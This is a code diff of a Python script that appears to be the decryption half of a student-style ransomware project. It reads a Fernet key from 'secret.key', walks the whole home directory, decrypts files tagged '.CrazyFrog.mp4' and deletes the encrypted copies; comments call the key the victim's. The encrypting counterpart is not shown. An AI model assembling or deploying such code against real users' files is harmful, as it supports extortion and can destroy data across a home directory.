@@ -1,50 +1,57 @@
-#####Docker part, Attacker PC#####
+
+#############[Packages]#############
+###### cryptography package has our Fernet Symetric Encryption
+######  ↳ AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.
+######    HMAC using SHA256 for authentication.
 from cryptography.fernet import Fernet
 import os
-import glob
+import glob #finds all the pathnames matching a specified pattern
+####################################
 
-#with open('secret.key','rb') as magic_file:  #was secret.key
-#    key = magic_file.read()
-#    magic_file.close()
 
-file = open('secret.key', 'rb')  # Open the file as wb to read bytes
-key = file.read()  # The key will be type bytes
+
+############[Open Victim's Key]############
+file = open('secret.key', 'rb')
+key = file.read()
 file.close()
-
-#print(f'your key is: {key}') #debugging
 fernet = Fernet(key)
+###########################################
 
 
 
+############[Directory Setup]############
+homeDir = os.path.expanduser('~')   #Grabs our home folder
+files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #Looks at everything in our Home Directory
+#########################################
 
-homeDir = os.path.expanduser('~')
-files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs folder we want to enc   f'{homeDir}/**/*.*', recursive=True) 
 
 
+############[Targeting Files]############
+###### Possibly unnecessary
 file_list=[]
 for filename in files:
     if ".key" not in filename and ".py" not in filename:
-        #print(f'im looking at: {filename}')
         file_list.append(filename)
+#########################################
 
 
-for entry in file_list: #was files
-    with open(entry, 'rb') as f:
+
+############[Decrypting Files]############
+for file in file_list:
+    with open(file, 'rb') as f:
         f_bytes = f.read()
         
     f_bytes_decrypt = fernet.decrypt(f_bytes)
     
-    fileName = str(entry).replace('.CrazyFrog.mp4','')     ##added this replaces the old 'enc' extensions with original extensions
-
-
-   # extension = os.path.splitext(fileName)[1] ###gets all extensions
+    fileName = str(file).replace('.CrazyFrog.mp4','')   #Replaces our Encrypted File's Extension with the file's Original Extensions
     
-    
-    #print(fileName, extension)
-    
-    decFile = fileName #+ extension  ##works       
+    decFile = fileName   #Build our Decrypted file, Filename without the CrazyFrog.mp4 extension, possibly unnecessary 
+          
     with open(decFile,'wb') as f:
-        f.write(f_bytes_decrypt)
-        os.remove(entry)    #removes the old encrypted file
+        f.write(f_bytes_decrypt)   #Writes our decrypted bytes to the file with the Original Extensions
+        os.remove(file)            #Removes the old encrypted file
+##########################################
+
+
 
 print("successfully decrypted all files")
